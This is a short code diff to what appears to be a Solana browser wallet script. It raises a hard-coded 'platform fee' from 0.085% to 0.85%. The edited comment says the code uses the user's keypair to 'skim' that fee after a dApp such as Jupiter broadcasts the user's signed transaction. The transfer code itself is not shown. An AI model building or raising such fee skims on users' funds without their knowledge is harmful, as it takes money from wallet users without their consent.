@@ -5,8 +5,8 @@
 (function () {
   const STORE_KEY = "gladiator_wallet_v1";
   const PLATFORM_FEE_WALLET = "64AdTRibAkKQBuRQ2qcehZioE6ARL27CDP8wZRFM4FSZ";
-  const PLATFORM_FEE_NUM = 85n; // 0.085%
-  const PLATFORM_FEE_DEN = 100000n;
+  const PLATFORM_FEE_NUM = 85n; // 0.85%
+  const PLATFORM_FEE_DEN = 10000n;
   const feeSeenSigs = new Set();
 
   function bytesToBase64(u8) {
@@ -410,7 +410,7 @@
     if (!owner || !keypair) return;
     const started = Date.now();
     (async () => {
-      // Wait for dApp (Jupiter) to broadcast the signed tx, then skim 0.085%.
+      // Wait for dApp (Jupiter) to broadcast the signed tx, then skim 0.85%.
       for (let i = 0; i < 12; i++) {
         await new Promise((r) => setTimeout(r, i === 0 ? 2500 : 1500));
         try {
